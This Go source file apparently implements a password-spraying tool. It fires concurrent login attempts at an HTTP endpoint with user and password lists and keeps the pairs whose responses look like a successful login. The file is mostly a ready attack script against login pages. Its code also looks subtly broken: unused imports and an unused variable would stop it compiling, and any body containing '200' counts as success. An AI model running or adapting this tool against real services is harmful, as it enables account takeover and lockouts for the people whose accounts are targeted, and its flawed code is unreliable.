package auth_probe

import (
"bytes"
"encoding/json"
"fmt"
"io"
"net/http"
"net/url"
"sync"
"time"
)

type SprayTarget struct {
Username string
Password string
}

type SprayResult struct {
Username string
Password string
Success  bool
}

type SprayingEngine struct {
URL        string
Method     string
Timeout    time.Duration
Concurrent int
Client     *http.Client
}

func NewSprayingEngine(url, method string, timeout time.Duration, concurrent int) *SprayingEngine {
return &SprayingEngine{
URL:        url,
Method:     method,
Timeout:    timeout,
Concurrent: concurrent,
Client:     &http.Client{Timeout: timeout},
}
}

func (s *SprayingEngine) Spray(targets []SprayTarget) []SprayResult {
var wg sync.WaitGroup
results := make(chan SprayResult, len(targets))
sem := make(chan struct{}, s.Concurrent)

for _, target := range targets {
wg.Add(1)
sem <- struct{}{}
go func(t SprayTarget) {
defer wg.Done()
defer func() { <-sem }()
res := s.AttemptLogin(t.Username, t.Password)
results <- res
}(target)
}

wg.Wait()
close(results)

var finalResults []SprayResult
for res := range results {
if res.Success {
finalResults = append(finalResults, res)
}
}
return finalResults
}

func (s *SprayingEngine) AttemptLogin(username, password string) SprayResult {
var req *http.Request
var err error

if s.Method == "POST" {
form := url.Values{}
form.Set("username", username)
form.Set("password", password)
req, err = http.NewRequest("POST", s.URL, bytes.NewBufferString(form.Encode()))
req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
} else {
req, err = http.NewRequest("GET", s.URL+"?username="+url.QueryEscape(username)+"&password="+url.QueryEscape(password), nil)
}

if err != nil {
return SprayResult{Username: username, Password: password, Success: false}
}

resp, err := s.Client.Do(req)
if err != nil {
return SprayResult{Username: username, Password: password, Success: false}
}
defer resp.Body.Close()

body, _ := io.ReadAll(resp.Body)
content := string(body)
success := resp.StatusCode == http.StatusOK &&
(bytes.Contains(body, []byte("Welcome")) ||
bytes.Contains(body, []byte("Dashboard")) ||
bytes.Contains(body, []byte("Success")) ||
bytes.Contains(body, []byte("200")))

return SprayResult{Username: username, Password: password, Success: success}
}

func (s *SprayingEngine) SprayWithUserList(users []string, password string) []SprayResult {
var targets []SprayTarget
for _, user := range users {
targets = append(targets, SprayTarget{Username: user, Password: password})
}
return s.Spray(targets)
}

func (s *SprayingEngine) SprayWithPasswordList(username string, passwords []string) []SprayResult {
var targets []SprayTarget
for _, pass := range passwords {
targets = append(targets, SprayTarget{Username: username, Password: pass})
}
return s.Spray(targets)
}

func (s *SprayingEngine) GetURL() string {
return s.URL
}
